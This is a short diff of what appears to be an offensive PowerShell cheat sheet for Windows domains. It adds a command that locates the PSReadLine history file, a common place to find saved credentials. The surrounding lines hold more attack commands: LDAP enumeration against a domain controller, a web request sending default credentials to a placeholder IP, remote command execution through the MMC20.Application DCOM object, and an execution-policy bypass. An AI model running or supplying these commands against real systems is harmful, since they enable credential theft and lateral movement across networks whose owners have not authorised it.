@@ -23,3 +23,4 @@ $direntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN"
 iwr -UseDefaultCredentials http://IP
 [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "IP")).Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c COMMAND", "7")
 powershell -ep bypass
+(Get-PSReadlineOption).HistorySavePath
